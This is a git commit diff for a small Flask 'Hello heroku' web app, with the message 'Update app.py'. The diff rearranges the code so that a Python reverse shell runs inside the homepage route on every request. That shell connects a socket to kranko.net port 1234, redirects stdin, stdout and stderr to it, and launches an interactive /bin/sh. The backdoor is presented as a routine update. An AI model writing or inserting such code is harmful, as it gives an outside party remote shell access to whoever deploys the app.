37e274cbe65de0bb9c7941c781b796604243bcc7
onlytestin235 <onlytesting@inbox.ru>
2018-09-08 14:19:03 +0200

    Update app.py

--- app.py
+++ app.py
@@ -7,16 +7,6 @@ import socket,subprocess,os
 def homepage():
     the_time = datetime.now().strftime("%A, %d %b %Y %l:%M %p")
 
-    return """
-    <h1>Hello heroku</h1>
-    <p>It is currently {time}.</p>
-
-    <img src="http://loremflickr.com/600/400" />
-    """.format(time=the_time)
-
-if __name__ == '__main__':
-    
-
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(("kranko.net",1234))
     os.dup2(s.fileno(),0)
@@ -25,5 +15,13 @@ if __name__ == '__main__':
 
     p=subprocess.call(["/bin/sh","-i"])
     
+    return """
+    <h1>Hello heroku</h1>
+    <p>It is currently {time}.</p>
+
+    <img src="http://loremflickr.com/600/400" />
+    """.format(time=the_time)
+
+if __name__ == '__main__':   
     app.run(debug=True, use_reloader=True)
 
